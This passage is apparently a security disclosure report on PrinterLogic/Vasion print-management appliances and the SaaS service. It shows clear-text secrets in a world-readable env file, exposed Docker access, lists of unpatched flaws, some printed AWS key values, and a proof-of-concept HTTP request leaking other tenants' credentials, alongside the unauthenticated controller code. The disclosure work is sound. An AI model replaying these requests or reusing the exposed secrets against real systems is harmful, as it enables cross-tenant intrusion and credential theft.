<p>If an attacker has access to the file <code>/etc/printercloud/appliance.env</code> OR access to any Docker instance, then the appliance can be completely compromised by uploading a malicious firmware image, without administrator credentials.</p>
<p>The compromise of any Docker instance means that the solution is completely compromised.</p>
<p><code>/etc/printercloud/appliance.env</code> containing the variable in clear-text with insecure permissions:</p>
<pre>
root@printerlogic:~# ls -la /etc/printercloud/appliance.env
<font color=red>-rwxrwxr-x</font> 1 ubuntu docker 858 Jan 27 10:16 /etc/printercloud/appliance.env
root@printerlogic:~# cat /etc/printercloud/appliance.env
[...]
# Anything below this line has been added via script/automation
VA_VERSION="1.0.730"
<font color=red>MS_AUTH_KEY="ccb33b57-7960-409c-9d15-b6c5b475c839"</font>
APPLIANCE_LOG_DIR="/var/www/efs_storage/logs/oddhok71vqjdjhjtous8xy3vx"
APP_KEY="1U3leCKOyUKV2NHfYHFJ3bH9l5JU8X7M"
MYSQL_ROOT_PASSWORD="0aa58a30-9f32-4731-a03c-3795fe49c0f3"
[...]
root@printerlogic:~#
</pre>

<p>The variable sign will appear in the source of the webpage <code>http://target/admin/generators/management_ts_account.php</code>. The source code comes from the included page <code>/var/www/app/admin/design/management_accountts_pcabout.php</code>.</p>
<p>Content of <code>/var/www/app/admin/design/management_accountts_pcabout.php</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
[<span style="color: #666666">...</span>]
 <span style="color: #666666">10</span>         <span style="color: #BA2121">&#39;about.va.versions&#39;</span>,
 <span style="color: #666666">11</span>         [
 <span style="color: #666666">12</span>             <span style="color: #BA2121">&#39;versions&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #008000">json_encode</span>(VaService<span style="color: #666666">::</span><span style="color: #7D9029">getPackageVersions</span>()),
 <span style="color: #666666">13</span>             <span style="color: #BA2121">&#39;date&#39;</span> <span style="color: #666666">=&gt;</span> VaService<span style="color: #666666">::</span><span style="color: #7D9029">getUpdateTimestamp</span>(),
 <span style="color: #666666">14</span>             <span style="color: #BA2121">&#39;updateAvailable&#39;</span> <span style="color: #666666">=&gt;</span> VaService<span style="color: #666666">::</span><span style="color: #7D9029">isApplianceUpdateAvailable</span>(),
 <span style="color: #666666">15</span>             <span style="color: #BA2121">&#39;apiSignInfo&#39;</span> <span style="color: #666666">=&gt;</span> SignService<span style="color: #666666">::</span><span style="color: #7D9029">getSignInfo</span>(<span style="color: #BA2121">&#39;va-api&#39;</span>),
 <span style="color: #666666">16</span>             <span style="color: #BA2121">&#39;gwUrl&#39;</span> <span style="color: #666666">=&gt;</span> config(<span style="color: #BA2121">&#39;api.gw.public_url&#39;</span>),
</pre></div>

<p>Regarding the recovery of the <code>MS_AUTH_KEY</code> value using the timestamp and the siteId values, it appears this attack is not possible with the current hardware. The attacker knows the result of hash(<code>MS_AUTH_KEY siteId timeStamp</code>), the timestamp value and the siteId, allowing him to test MS_AUTH_KEY values:</p>
<pre><code>known_hash = bcrypt(`MS_AUTH_KEY known_siteId known_timeStamp`, cost = 10)
</code></pre>
<p>A bruteforce attack using all different MS_AUTH_KEY values (the '-' characters  and the 15th character '4' are always at the same position using random uuids provided by the Linux kernel) will require testing 16^31 possibilities. This bruteforce capacity is not likely to be available for average attackers.</p>
<p>An initial analysis of the <code>/opt/av-api</code> (from the Docker instance va-api) has been done. This is a HTTP server implementing APIs for the route /v1/*:</p>
<p><img alt="" src="images/2025-vasion-report-1-va-api.png" /></p>
<p><a href="images/2025-vasion-report-1-va-api-full.png">Click here for full image</a></p>
<p>Reverse Engineering va-api</p>
<p>It appears the program <code>/opt/va-api</code> reads the variable <code>MS_AUTH_KEY</code> in <code>/etc/printercloud/appliance.env</code> to confirm if the sign and timestamp variables are valid. This docker has full RW privileges to the <code>/etc/printercloud</code> directory:</p>
<pre><code>root@printerlogic:/var/www/efs_storage/logs/oddhok71vqjdjhjtous8xy3vx# docker exec -it 7943f93771b1 /bin/sh
/ # mount | grep printercloud
/dev/mapper/printerlogic--vg-root on /etc/printercloud type ext4 (rw,relatime,errors=remount-ro,data=ordered)
/ #
</code></pre>
<p>This program was not analysed but contains a lot of interesting functions (e.g. managing the update processus). Futhermore, this Docker instance is exposed (<a href="#va-insecure-access-docker-instances-from-wan">non-assigned CVE vulnerability - Insecure access to Docker instances from the WAN</a>).</p>
<p>If any attacker compromises any Docker instance, then he can upload malicious firmware updates and install them without authentication.</p>
<p>The compromise of any Docker instance means the solution is completely compromised.</p>
<p>There is no accountability regarding the firmware update process - it is not possible to associate the update process with a specific administrator.</p>
<p>The firmware upgrade mechanism is insecure (and was successfully compromised in the 2024 security assessment: <a href="#va-rce-02">Remote take over of PrinterLogic instances (Remote Code Execution)</a>).</p>
<h2>Security assessment done in 2024</h2>
<h2>Identification of the solution</h2>
<p>The audited PrinterLogic version is 22.0.893 (December 2023).</p>
<p>The audited host version is 1.0.730.</p>
<p>This PrinterLogic version has been retrieved from https://help.printerlogic.com/va/1-Printerlogic/Release_Notes/VA_Latest_Host_Builds.htm (OpenBuild 22.0.893: December 1st, 2023).</p>
<p>The host version has been retrieved from https://docs.printerlogicva.com/1-Printerlogic/Release_Notes/VA_Latest_Host_Builds.htm (Build 1.0.730: December 30th, 2021).</p>
<p>Checksums of the audited versions:</p>
<pre><code>b06c9938b8ec5fd47a41fb7188d8e50fd9bac727a2ac0e84e4719524a124f744  printerinstaller-22.0.893.ova
</code></pre>
<p>The VA version was updated to the latest version (20.0.2140 from 04/01/2024).</p>
<p>The solutions use several Docker instances - all the instances have been made up to date, as shown below:</p>
<p>PrinterLogic VA version
<img alt="" src="images/2025-vasion-report-2-local-version-01.png" /></p>
<p>PrinterLogic VA version
<img alt="" src="images/2025-vasion-report-2-local-version-02.png" /></p>
<p>PrinterLogic SaaS version on [redacted].printerlogic10.com
<img alt="" src="images/2025-vasion-report-2-saas-version.png" /></p>
<p><a href="images/2025-vasion-report-2-saas-version-full.png">Click here for full image</a></p>
<h2>Previous vulnerabilities found in the SaaS/VA versions</h2>
<h2>List of unpatched vulnerabilities - analysis of vulnerabilities found in 2022</h2>
<p>These vulnerabilities have not been patched:</p>
<ul>
<li>Hardcoded password for the ubuntu user;</li>
<li>
<ul>
<li>incomplete patch: /etc/shadow OK but /etc/sudoers still contains an entry for ubuntu;</li>
</ul>
</li>
<li>Insecure communications to printers and insecure communications to micro-services by disabling all SSL verifications;</li>
<li>Password for 'network' stored in clear-text inside /etc/issue, world-readable;</li>
<li>Hardcoded SSH keys + private SSH keys for [redacted]@printerlogic.com;</li>
<li>Lack of firewall between Docker instances;</li>
<li>Insecure access to Docker instances from the WAN;</li>
<li>Incorrect security architecture and wrong permissions in /var/www/efs_storage allowing allowing to compromise the solution;</li>
<li>Outdated, End-Of-Life, unsupported and vulnerable components (Nginx, libraries, Laravel, operating systems);</li>
<li>Processes running as root in Docker instances;</li>
<li>Creation of administrator cookies using the credentials of regular users;</li>
<li>Incorrect Access Control to PHP webpages allowing to reach printers;</li>
<li>SSRF everywhere in /var/www/app/;</li>
<li>XSS everywhere in /www/app/admin/*;</li>
<li>Remote Code Executions using eval() - requires administrator privileges;</li>
<li>
<ul>
<li>Incorrectly patched;</li>
</ul>
</li>
<li>Insecure SSH configuration;</li>
<li>Incorrect encryption algorithms used to store passwords;</li>
<li>GPG Private key stored in the solution;</li>
<li>Passwords readable and stored in clear-text;</li>
<li>Hardcoded SSL certificate / Private keys;</li>
<li>Insecure firmware image update using the MS_AUTH_KEY variable.</li>
</ul>
<h2>List of patched vulnerabilities - analysis of vulnerabilities found in 2022</h2>
<p>These vulnerabilities have been patched:</p>
<ul>
<li>Hardcoded SSH server keys;</li>
<li>Hardcoded AWS secret key and Presence of CI/CD scripts;</li>
<li>
<ul>
<li>found invalid creds: AKIAQZ3LX27RE4BOH66J/ixKgihrTK5vmPrcPJhAO0TOtcOUaVJEQmeuBUQDS, AKIAIWHNML7OFS67RVKQ/gkZYcXhsFCxw9SAoqXCR06WgxBa3T02UiD31NcBV, AKIAJ5I5ZX5VQ43PMYIQ/TZy2BVyDJB73J2fuLi7rbqIW2nXnVvvsUQ5PjBF0), reference to a specific s3 bucket: appliance-storage-01-us-west-2-dbbackups does not seem exploitable;</li>
</ul>
</li>
<li>Hardcoded Mailgun credentials;</li>
<li>Hardcoded OKTA Private key;</li>
<li>XSS in the license generator and weak encryption algorithm;</li>
<li>Pre-authentication Elatec password disclosure, Change to a malicious Elatec server and Blind-SSRF;</li>
<li>Pre-authentication SSRF and Change of RFIDeas;</li>
<li>Pre-authentication Stored XSS in /var/www/app/console_release/fast_release/register_badge.php;</li>
<li>XSS in /var/www/app/console_release/fast_release/ register_badge_new.php;</li>
<li>XSS in /www/app/admin/design/reports/overview_popup.php and Incorrect Access Control;</li>
<li>Dangerous PHP dead code;</li>
<li>Samba password available in the process list;</li>
<li>Supply Chain attack against the PrinterLogic build system;</li>
<li>Vulnerable OpenID implementation.</li>
</ul>
<h2>Previous vulnerabilities found in the macOS/Linux clients</h2>
<h3>Identification of the solution</h3>
<p>The version of the audited macOS/Linux client is 21.1.0.658.</p>
<h3>List of unpatched vulnerabilities</h3>
<p>These vulnerabilities have not been patched:</p>
<ul>
<li>Incorrect permissions in /opt/PrinterInstallerClient/log;</li>
<li>
<ul>
<li>No modified, risk accepted by the vendor;</li>
</ul>
</li>
<li>Lack of authentication of the communication between services;</li>
<li>
<ul>
<li>Not patched - design is insecure;</li>
</ul>
</li>
<li>Potential upload of new drivers;</li>
<li>
<ul>
<li>when using /admin with a normal user -&gt; upload works;</li>
</ul>
</li>
<li>Outdated OpenSSL version.</li>
</ul>
<h3>List of patched vulnerabilities</h3>
<p>These vulnerabilities have been patched:</p>
<ul>
<li>Hardcoded Private key for the PrinterLogic CA and Hardcoded password;</li>
<li>Leak of secrets inside the logs;</li>
<li>Bypass of admin commands using IPC;  </li>
<li>Insecure generation of debug archive;  </li>
<li>Arbitrary File Read as root;</li>
<li>Arbitrary File Write as root. </li>
</ul>
<h2>Previous vulnerabilities found in the Windows client</h2>
<h3>Identification of the solution</h3>
<p>The version of the audited Windows client version is 25.0.0.983.</p>
<h3>List of unpatched vulnerabilities</h3>
<p>These vulnerabilities have not been patched:</p>
<ul>
<li>PrinterInstallerClientInterface.exec, PrinterInstallerClient.exe and PrinterInstallClientLauncher.exe have No data execution prevention, no ASLR, no CFG and no stack protection;</li>
<li>Local Privilege Escalation via C:\Windows\Temp\PPP\Log (a process running as NT AUTHORITY\SYSTEM is used to read/write files inside a full-R/W directory).</li>
</ul>
<h3>List of patched vulnerabilities</h3>
<p>These vulnerabilities have been patched:</p>
<ul>
<li>Hardcoded Private key for the PrinterLogic CA and Hardcoded password;</li>
<li>Local Privilege Escalation - C:\Users\pfq\AppData\Local\Temp\ not used anymore. Instead C:\Windows\PPP_TEMP is securely used;</li>
<li>Remote Code Execution using PrinterLogic (Execution of C:\Program.exe during the installation of a driver).</li>
</ul>
<h2>Vulnerabilities affecting the SaaS version</h2>
<h2>Identification of the solution</h2>
<p>PrinterLogic SaaS version on [redacted].printerlogic10.com
<img alt="" src="images/2025-vasion-report-2-saas-version.png" /></p>
<p><a href="images/2025-vasion-report-1-saas-version-full.png">Click here for full image</a></p>
<p><a id="saas-cross-tenant-password-disclosure"></a></p>
<h2>Details - Cross-tenant vulnerability - disclosure of passwords of other customers and change of settings of any tenant</h2>
<p>It was observed that the <code>/api-gateway/br/devices</code> API is insecure - this API will display the passwords of other tenants using the SaaS version. It appears that it is also possible to change the settings of other tenants (not tested but the source code does not implement authentication so it is vulnerable).</p>
<p>In cloud computing, tenancy refers to the sharing of computing resources in a private or public environment that is isolated from other users and kept secret. Cross-tenant vulnerabilities allow a customer to interact with data/infrastructure used by another customer, breaking a critical security boundary.</p>
<p>We can confirm that the displayed passwords correspond to other tenants since the <code>siteID</code> variables are specified in the HTTP answer. For the security assessment, the siteID variables is <code>[redacted1]</code> (prod instance) and <code>[redacted2]</code> (test instance). An attacker can find information corresponding to other tenants (with siteID variables <code>[redacted]</code>, <code>[redacted]</code>, <code>[redacted]</code>, ...):</p>
<p>Disclosure of credentials using the <code>/api-gateway/br/devices</code> API:
<img alt="" src="images/2025-vasion-report-2-cross-tenant-passwords-leak.png" /></p>
<p><a href="images/2025-vasion-report-2-cross-tenant-passwords-leak-full.png">Click here for full image</a></p>
<p>PoC - HTTP request to https://[redacted].printercloud10.com/api-gateway/br/devices</p>
<pre><code>GET /api-gateway/br/devices HTTP/2
Host: [redacted].printercloud10.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: application/xml, text/xml, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Csrf-Token: mG855uOhde1KjgHFrfdLdHHNejyllHHF07DL93Lj
X-Requested-With: XMLHttpRequest
Content-Length: 0
Origin: https://[redacted].printercloud10.com
Referer: https://[redacted].printercloud10.com/admin/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
</code></pre>
<p>And the reply provides clear-text credentials corresponding to other tenants while the request is sent to the <code>[redacted]</code> tenant.</p>
<p>HTTP answer prodiving credentials of other tenants while interacting with the <code>[redacted]</code> tenant:</p>
<pre><code>HTTP/2 200 OK
Date: Mon, 18 Dec 2023 14:26:40 GMT 
Content-Type: application/json
Cache-Control: no-store, no-cache, must-revalidate
Cache-Control: no-cache, private
Content-Security-Policy: frame-ancestors 'self'
Expires: Thu, 19 Nov 1981 08:52:00 GMT 
Pragma: no-cache
Server: nginx
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-Xss-Protection: 1; mode=block
{
  "data": [
    {   
      "type": "devices",
      "id": "[redacted]",
      "attributes": {
        "siteId": "[redacted]",
        "type": "[redacted]",
        "ipAddress": "[redacted]",
        "username": "[redacted]",
        "password": "[redacted]",
        "printerId": "[redacted]" 
      },  
      "relationships": {
        "deviceType": {
          "slug": "[redacted]",
          "name": "[redacted]",
          "credentials": true
        }   
      }   
    },  
    [...]
    {   
      "type": "devices",
      "id": "[redacted]",
      "attributes": {
        "siteId": "[redacted]",
        "type": "[redacted]",
        "ipAddress": "[redacted]",
        "username": "[redacted]",
        "password": "[redacted]",
        "printerId": "[redacted]" 
      },  
      "relationships": {
        "deviceType": {
          "slug": "[redacted]",
          "name": "[redacted]",
          "credentials": true
        }   
      }   
    },  
    {   
      "type": "devices",
      "id": "[redacted]",
      "attributes": {
        "siteId": "[redacted]",
        "type": "[redacted]",
        "ipAddress": "[redacted]",
        "username": "[redacted-DC-domain]\\Administrator",
        "password": "[redacted]",
        "printerId": "[redacted]" 
      },  
      "relationships": {
        "deviceType": {
          "slug": "[redacted]",
    [...]
</code></pre>
<p>The APIs are defined in the <code>printerlogic/br</code> Docker instance and do not implement authentication: an attacker can view/edit settings corresponding to other tenants:</p>
<p>Content of <code>/var/www/app/routes/api.php</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #BC7A00">&lt;?php</span>
[<span style="color: #666666">...</span>]
<span style="color: #008000; font-weight: bold">use</span> Illuminate\Http\Request;

<span style="color: #408080; font-style: italic">/*</span>
<span style="color: #408080; font-style: italic">|--------------------------------------------------------------------------</span>
<span style="color: #408080; font-style: italic">| API Routes</span>
<span style="color: #408080; font-style: italic">|--------------------------------------------------------------------------</span>
<span style="color: #408080; font-style: italic">|</span>
<span style="color: #408080; font-style: italic">| Here is where API routes are registered for the application. These</span>
<span style="color: #408080; font-style: italic">| routes are loaded by the RouteServiceProvider within a group which</span>
<span style="color: #408080; font-style: italic">| is assigned the &quot;api&quot; middleware group.</span>
<span style="color: #408080; font-style: italic">|</span>
<span style="color: #408080; font-style: italic">*/</span>

Route<span style="color: #666666">::</span><span style="color: #7D9029">get</span>(<span style="color: #BA2121">&#39;meta&#39;</span>, <span style="color: #BA2121">&#39;MetaController@index&#39;</span>);

Route<span style="color: #666666">::</span><span style="color: #7D9029">middleware</span>([<span style="color: #BA2121">&#39;auth.key&#39;</span>])<span style="color: #666666">-&gt;</span><span style="color: #7D9029">group</span>(<span style="color: #008000; font-weight: bold">function</span> () {
    <span style="color: #BA2121; font-style: italic">/**</span>
<span style="color: #BA2121; font-style: italic">     * Device routes</span>
<span style="color: #BA2121; font-style: italic">     */</span>
    Route<span style="color: #666666">::</span><span style="color: #7D9029">get</span>(<span style="color: #BA2121">&#39;devices&#39;</span>, <span style="color: #BA2121">&#39;DeviceController@index&#39;</span>);
    Route<span style="color: #666666">::</span><span style="color: #7D9029">get</span>(<span style="color: #BA2121">&#39;devices/{id}&#39;</span>, <span style="color: #BA2121">&#39;DeviceController@show&#39;</span>);
    Route<span style="color: #666666">::</span><span style="color: #7D9029">post</span>(<span style="color: #BA2121">&#39;devices&#39;</span>, <span style="color: #BA2121">&#39;DeviceController@store&#39;</span>);
    Route<span style="color: #666666">::</span><span style="color: #7D9029">put</span>(<span style="color: #BA2121">&#39;devices/{id}&#39;</span>, <span style="color: #BA2121">&#39;DeviceController@update&#39;</span>);
    Route<span style="color: #666666">::</span><span style="color: #7D9029">delete</span>(<span style="color: #BA2121">&#39;devices/{id}&#39;</span>, <span style="color: #BA2121">&#39;DeviceController@destroy&#39;</span>);

    <span style="color: #BA2121; font-style: italic">/**</span>
<span style="color: #BA2121; font-style: italic">     * Device type routes</span>
<span style="color: #BA2121; font-style: italic">     */</span>
    Route<span style="color: #666666">::</span><span style="color: #7D9029">get</span>(<span style="color: #BA2121">&#39;device-types&#39;</span>, <span style="color: #BA2121">&#39;DeviceTypeController@index&#39;</span>);
    Route<span style="color: #666666">::</span><span style="color: #7D9029">get</span>(<span style="color: #BA2121">&#39;device-types/{slug}&#39;</span>, <span style="color: #BA2121">&#39;DeviceTypeController@show&#39;</span>);
});
</pre></div>

<p>Since authentication is not implemented, any user in any tenant can edit badge devices of any tenant:</p>
<p>Content of <code>/var/www/app/app/Http/Controllers/DeviceController.php</code> implementing the previous methods:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #BC7A00">&lt;?php</span>

<span style="color: #008000; font-weight: bold">namespace</span> App\Http\Controllers;

<span style="color: #008000; font-weight: bold">use</span> App\Http\Controllers\Traits\ApiResponse;
<span style="color: #008000; font-weight: bold">use</span> App\Http\Requests\DeviceRequest;
<span style="color: #008000; font-weight: bold">use</span> App\Models\Device;
<span style="color: #008000; font-weight: bold">use</span> App\Models\DeviceAttribute;
<span style="color: #008000; font-weight: bold">use</span> App\Services\DeviceService;
<span style="color: #008000; font-weight: bold">use</span> App\Transformers\DeviceTransformer;
<span style="color: #008000; font-weight: bold">use</span> Illuminate\Database\QueryException;
<span style="color: #008000; font-weight: bold">use</span> Illuminate\Http\JsonResponse;
<span style="color: #008000; font-weight: bold">use</span> Symfony\Component\HttpFoundation\Response <span style="color: #008000; font-weight: bold">as</span> HttpResponse;

<span style="color: #BA2121; font-style: italic">/**</span>
<span style="color: #BA2121; font-style: italic"> * Class DeviceController</span>
<span style="color: #BA2121; font-style: italic"> */</span>
<span style="color: #008000; font-weight: bold">class</span> <span style="color: #0000FF; font-weight: bold">DeviceController</span>
{
    <span style="color: #008000; font-weight: bold">use</span> ApiResponse;

    <span style="color: #008000; font-weight: bold">const</span> <span style="color: #880000">INVALID_DEVICE_ERROR</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;INVALID-DEVICE&#39;</span>;

    <span style="color: #008000; font-weight: bold">private</span> <span style="color: #19177C">$service</span>;

    <span style="color: #BA2121; font-style: italic">/**</span>
<span style="color: #BA2121; font-style: italic">     * DeviceController constructor</span>
<span style="color: #BA2121; font-style: italic">     *</span>
<span style="color: #BA2121; font-style: italic">     * @param DeviceService $deviceService DeviceService object</span>
<span style="color: #BA2121; font-style: italic">     *</span>
<span style="color: #BA2121; font-style: italic">     * @return void</span>
<span style="color: #BA2121; font-style: italic">     */</span>
    <span style="color: #008000; font-weight: bold">public</span> <span style="color: #008000; font-weight: bold">function</span> <span style="color: #0000FF">__construct</span>(DeviceService <span style="color: #19177C">$deviceService</span>)
    {
        <span style="color: #19177C">$this</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">service</span> <span style="color: #666666">=</span> <span style="color: #19177C">$deviceService</span>;
    }

    <span style="color: #BA2121; font-style: italic">/**</span>
<span style="color: #BA2121; font-style: italic">     * Return all devices</span>
<span style="color: #BA2121; font-style: italic">     *</span>
<span style="color: #BA2121; font-style: italic">     * @return array</span>
<span style="color: #BA2121; font-style: italic">     */</span>
    <span style="color: #008000; font-weight: bold">public</span> <span style="color: #008000; font-weight: bold">function</span> <span style="color: #0000FF">index</span>()<span style="color: #666666">:</span> <span style="color: #008000; font-weight: bold">array</span>
    {
        <span style="color: #19177C">$devices</span> <span style="color: #666666">=</span> Device<span style="color: #666666">::</span><span style="color: #7D9029">all</span>();

        <span style="color: #008000; font-weight: bold">return</span> fractal()<span style="color: #666666">-&gt;</span><span style="color: #7D9029">create</span>()
                <span style="color: #666666">-&gt;</span><span style="color: #7D9029">collection</span>(<span style="color: #19177C">$devices</span>)
                <span style="color: #666666">-&gt;</span><span style="color: #7D9029">transformWith</span>(<span style="color: #008000; font-weight: bold">new</span> DeviceTransformer())
                <span style="color: #666666">-&gt;</span><span style="color: #7D9029">withResourceName</span>(<span style="color: #BA2121">&#39;data&#39;</span>)
                <span style="color: #666666">-&gt;</span><span style="color: #7D9029">toArray</span>();
    }

    <span style="color: #BA2121; font-style: italic">/**</span>
<span style="color: #BA2121; font-style: italic">     * Display the specified resource.</span>
<span style="color: #BA2121; font-style: italic">     *</span>
<span style="color: #BA2121; font-style: italic">     * @param string $id Uuid of device</span>
<span style="color: #BA2121; font-style: italic">     *</span>
<span style="color: #BA2121; font-style: italic">     * @return array|JsonResponse</span>
<span style="color: #BA2121; font-style: italic">     */</span>
    <span style="color: #008000; font-weight: bold">public</span> <span style="color: #008000; font-weight: bold">function</span> <span style="color: #0000FF">show</span>(<span style="color: #19177C">$id</span>)
    {
        <span style="color: #19177C">$device</span> <span style="color: #666666">=</span> Device<span style="color: #666666">::</span><span style="color: #7D9029">find</span>(<span style="color: #19177C">$id</span>);

        <span style="color: #008000; font-weight: bold">if</span> (<span style="color: #666666">!</span><span style="color: #008000; font-weight: bold">empty</span>(<span style="color: #19177C">$device</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">id</span>)) {
            <span style="color: #008000; font-weight: bold">return</span> fractal()<span style="color: #666666">-&gt;</span><span style="color: #7D9029">create</span>()
                <span style="color: #666666">-&gt;</span><span style="color: #7D9029">item</span>(<span style="color: #19177C">$device</span>)
                <span style="color: #666666">-&gt;</span><span style="color: #7D9029">transformWith</span>(<span style="color: #008000; font-weight: bold">new</span> DeviceTransformer())
                <span style="color: #666666">-&gt;</span><span style="color: #7D9029">withResourceName</span>(<span style="color: #BA2121">&#39;data&#39;</span>)
                <span style="color: #666666">-&gt;</span><span style="color: #7D9029">toArray</span>();
        }

        <span style="color: #19177C">$message</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;Unable find record [&#39;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$id</span> <span style="color: #666666">.</span> <span style="color: #BA2121">&#39;]&#39;</span>;
        <span style="color: #008000; font-weight: bold">return</span> <span style="color: #19177C">$this</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">errorResponse</span>(<span style="color: #19177C">$message</span>, self<span style="color: #666666">::</span><span style="color: #7D9029">INVALID_DEVICE_ERROR</span>, HttpResponse<span style="color: #666666">::</span><span style="color: #7D9029">HTTP_NOT_FOUND</span>);
    }

    <span style="color: #BA2121; font-style: italic">/**</span>
<span style="color: #BA2121; font-style: italic">     * Store device data</span>
<span style="color: #BA2121; font-style: italic">     *</span>
<span style="color: #BA2121; font-style: italic">     * @param App\Http\Requests\DeviceRequest $request Incoming HTTP request</span>
<span style="color: #BA2121; font-style: italic">     *</span>
<span style="color: #BA2121; font-style: italic">     * @return array|JsonResponse</span>
<span style="color: #BA2121; font-style: italic">     */</span>
    <span style="color: #008000; font-weight: bold">public</span> <span style="color: #008000; font-weight: bold">function</span> <span style="color: #0000FF">store</span>(DeviceRequest <span style="color: #19177C">$request</span>)
    {
        <span style="color: #19177C">$siteId</span> <span style="color: #666666">=</span> <span style="color: #19177C">$request</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">header</span>(<span style="color: #BA2121">&#39;X-Site-ID&#39;</span>);
        <span style="color: #19177C">$data</span> <span style="color: #666666">=</span> <span style="color: #19177C">$request</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">get</span>(<span style="color: #BA2121">&#39;data&#39;</span>);

        <span style="color: #19177C">$device</span> <span style="color: #666666">=</span> <span style="color: #19177C">$this</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">service</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">create</span>(<span style="color: #19177C">$siteId</span>, <span style="color: #19177C">$data</span>);

        <span style="color: #19177C">$response</span> <span style="color: #666666">=</span> fractal()<span style="color: #666666">-&gt;</span><span style="color: #7D9029">create</span>()
            <span style="color: #666666">-&gt;</span><span style="color: #7D9029">item</span>(<span style="color: #19177C">$device</span>)
            <span style="color: #666666">-&gt;</span><span style="color: #7D9029">transformWith</span>(<span style="color: #008000; font-weight: bold">new</span> DeviceTransformer())
            <span style="color: #666666">-&gt;</span><span style="color: #7D9029">withResourceName</span>(<span style="color: #BA2121">&#39;data&#39;</span>)
            <span style="color: #666666">-&gt;</span><span style="color: #7D9029">toArray</span>();

        <span style="color: #008000; font-weight: bold">return</span> response()<span style="color: #666666">-&gt;</span><span style="color: #7D9029">json</span>(<span style="color: #19177C">$response</span>, HttpResponse<span style="color: #666666">::</span><span style="color: #7D9029">HTTP_CREATED</span>);
    }

    <span style="color: #BA2121; font-style: italic">/**</span>
<span style="color: #BA2121; font-style: italic">     * Update device data</span>
<span style="color: #BA2121; font-style: italic">     *</span>
<span style="color: #BA2121; font-style: italic">     * @param string $id The id of the device to udpate</span>
<span style="color: #BA2121; font-style: italic">     * @param App\Http\Requests\DeviceRequest $request Incoming HTTP request</span>
<span style="color: #BA2121; font-style: italic">     *</span>
<span style="color: #BA2121; font-style: italic">     * @return array|JsonResponse</span>
<span style="color: #BA2121; font-style: italic">     */</span>
    <span style="color: #008000; font-weight: bold">public</span> <span style="color: #008000; font-weight: bold">function</span> <span style="color: #0000FF">update</span>(string <span style="color: #19177C">$id</span>, DeviceRequest <span style="color: #19177C">$request</span>)
    {
        <span style="color: #19177C">$siteId</span> <span style="color: #666666">=</span> <span style="color: #19177C">$request</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">header</span>(<span style="color: #BA2121">&#39;X-Site-ID&#39;</span>);
        <span style="color: #19177C">$data</span> <span style="color: #666666">=</span> <span style="color: #19177C">$request</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">get</span>(<span style="color: #BA2121">&#39;data&#39;</span>);

        <span style="color: #19177C">$updatedDevice</span> <span style="color: #666666">=</span> <span style="color: #19177C">$this</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">service</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">update</span>(<span style="color: #19177C">$id</span>, <span style="color: #19177C">$siteId</span>, <span style="color: #19177C">$data</span>);

        <span style="color: #008000; font-weight: bold">if</span> (<span style="color: #19177C">$updatedDevice</span> <span style="color: #666666">!==</span> <span style="color: #008000; font-weight: bold">null</span>) {
            <span style="color: #008000; font-weight: bold">return</span> fractal()<span style="color: #666666">-&gt;</span><span style="color: #7D9029">create</span>()
                <span style="color: #666666">-&gt;</span><span style="color: #7D9029">item</span>(<span style="color: #19177C">$updatedDevice</span>)
                <span style="color: #666666">-&gt;</span><span style="color: #7D9029">transformWith</span>(<span style="color: #008000; font-weight: bold">new</span> DeviceTransformer())
                <span style="color: #666666">-&gt;</span><span style="color: #7D9029">withResourceName</span>(<span style="color: #BA2121">&#39;data&#39;</span>)
                <span style="color: #666666">-&gt;</span><span style="color: #7D9029">toArray</span>();
        }
        <span style="color: #19177C">$message</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;Unable find existing record [</span><span style="color: #BB6688; font-weight: bold">$id</span><span style="color: #BA2121">] to update&quot;</span>;
        <span style="color: #008000; font-weight: bold">return</span> <span style="color: #19177C">$this</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">errorResponse</span>(<span style="color: #19177C">$message</span>, self<span style="color: #666666">::</span><span style="color: #7D9029">INVALID_DEVICE_ERROR</span>, HttpResponse<span style="color: #666666">::</span><span style="color: #7D9029">HTTP_NOT_FOUND</span>);
    }

    <span style="color: #BA2121; font-style: italic">/**</span>
<span style="color: #BA2121; font-style: italic">     * Delete device data and its associated attributes</span>
<span style="color: #BA2121; font-style: italic">     *</span>
<span style="color: #BA2121; font-style: italic">     * @param string $id Uuid of device to be deleted</span>
<span style="color: #BA2121; font-style: italic">     *</span>
<span style="color: #BA2121; font-style: italic">     * @return JsonResponse</span>
<span style="color: #BA2121; font-style: italic">     */</span>
    <span style="color: #008000; font-weight: bold">public</span> <span style="color: #008000; font-weight: bold">function</span> <span style="color: #0000FF">destroy</span>(string <span style="color: #19177C">$id</span>)
    {
        <span style="color: #008000; font-weight: bold">try</span> {
            <span style="color: #19177C">$device</span> <span style="color: #666666">=</span> Device<span style="color: #666666">::</span><span style="color: #7D9029">find</span>(<span style="color: #19177C">$id</span>);

